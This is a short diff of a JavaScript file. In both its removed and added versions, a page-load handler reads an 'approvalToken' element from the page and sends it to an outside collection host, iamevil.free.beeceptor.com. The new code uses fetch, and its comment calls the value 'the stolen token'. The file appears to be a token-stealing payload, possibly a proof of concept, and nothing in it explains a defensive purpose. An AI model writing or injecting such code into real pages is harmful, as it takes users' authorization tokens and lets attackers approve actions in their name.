@@ -1,13 +1,10 @@
 window.onload = function() {
-    // Ensure the element containing approvalToken exists
-    const approvalTokenElement = document.getElementById('approvalToken');
-    
-    if (approvalTokenElement) {
-        // Capture the approval token
-        const approvalToken = approvalTokenElement.textContent.trim();
-        
-        // Send the token to Beeceptor immediately
-        var img = new Image();
-        img.src = `https://iamevil.free.beeceptor.com/?token=${encodeURIComponent(approvalToken)}`;
-    }
+    // Get the approval token from the page
+    var approvalToken = document.getElementById('approvalToken').innerText;
+
+    // Send the stolen token to Beeceptor using fetch
+    fetch('https://iamevil.free.beeceptor.com/?token=' + encodeURIComponent(approvalToken))
+        .then(response => response.text())
+        .then(data => console.log('Token sent to Beeceptor:', data))
+        .catch(error => console.error('Error sending token to Beeceptor:', error));
 };
